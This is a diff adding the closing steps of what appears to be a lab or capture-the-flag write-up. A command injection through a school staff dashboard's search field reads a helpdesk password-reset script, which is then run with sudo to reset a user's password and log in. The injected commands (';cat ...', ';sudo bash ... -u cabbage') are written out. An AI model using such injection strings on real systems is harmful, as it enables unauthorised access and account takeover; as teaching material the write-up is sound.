@@ -414,8 +414,103 @@ I will start by using [Metasploit Framework](https://github.com/rapid7/metasploi
 
     `https://potatos.potato-school.com/new_dashboard/staff_dashboard.php?query=a`
 
-    Additionally, the output also showed files that had the letter "a" included inside.
+    Additionally, the output also showed files that had the letter "a" included inside. The file `/home/potato-helpdesk/reset_password.sh` was the most stood out the most.
 
     ![Staff_Dashboard_Search_Field](Images/Staff_Dashboard_Search_Field.png)
 
+    After many attempts to read the file with various commands like `cat /potato-helpdesk/reset_password.sh`, I decided to search online found a github repo [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#chaining-commands) that showed the different methods of Command Injection, allowing me to successfully read the file by adding a semi-colon in front of the command: `;cat /home/potato-helpdesk/reset_password.sh`, giving the following output:
+
+    ```
+    #!/bin/bash
+
+    # Function to display usage
+    usage() {
+       echo "Usage: $0 -u <username>"
+       echo "Example: $0 -u student1"
+       exit 1
+    }
+
+    # Check if no arguments are provided
+    if [ $# -eq 0 ]; then
+       usage
+    fi
+
+    # Parse command line arguments
+    while getopts ":u:" opt; do
+       case ${opt} in
+        u )
+            user=$OPTARG
+            ;;
+        \? )
+            usage
+            ;;
+       esac
+    done
+
+    # Check if user is specified
+    if [ -z "$user" ]; then
+       usage
+    fi
+
+    # Check if the user exists on the system
+    if id "$user" &>/dev/null; then
+       # Reset password for the specified user
+       echo "Resetting password for user: $user"
+       echo "$user:password" | chpasswd
     
+       # Check if the password reset was successful
+       if [ $? -eq 0 ]; then
+          echo "Password for user '$user' has been reset successfully."
+       else
+          echo "Failed to reset password for user '$user'."
+          exit 1
+       fi
+    else
+       echo "User '$user' does not exist."
+       exit 1
+    fi
+    ```
+
+    Reading the code for `/home/potato-helpdesk/reset_password.sh` tells us that the if the user exists, it will reset the password for the user with `password` in the following code block:
+
+    ```
+    # Check if the user exists on the system
+    if id "$user" &>/dev/null; then
+       # Reset password for the specified user
+       echo "Resetting password for user: $user"
+       echo "$user:password" | chpasswd
+    ```
+
+    Additionally, the code also tells us how to use it in the start of the script, indicating that usage function (shebang) with the intepreter to use:
+
+    ```
+    #!/bin/bash
+
+    # Function to display usage
+    usage() {
+       echo "Usage: $0 -u <username>"
+       echo "Example: $0 -u student1"
+       exit 1
+    }
+    ```
+
+25) With all the information at hand, I attempted to change the password of the cabbage user with the command `;bash /home/potato-helpdesk/reset_password.sh -u cabbage` but received the output:
+
+    ```
+    Resetting password for user: cabbage
+    Changing password for cabbage.
+    Failed to reset password for user 'cabbage'.
+    ```
+
+    Assuming that it was a permissions issue, I decided to add the `sudo` command in front of the initial command & received the following output:
+
+    ```
+    Resetting password for user: cabbage
+    Password for user 'cabbage' has been reset successfully.
+    ```
+
+26) Since I know that the password will be changed to `password` upon reset, I attempted to log into Cabbage's account in the Pootato VM with `password` & and was successful.
+
+    ![Cabbage_Account_Successful_Login](Images/Cabbage_Account_Successful_Login.png)
+
+# The End
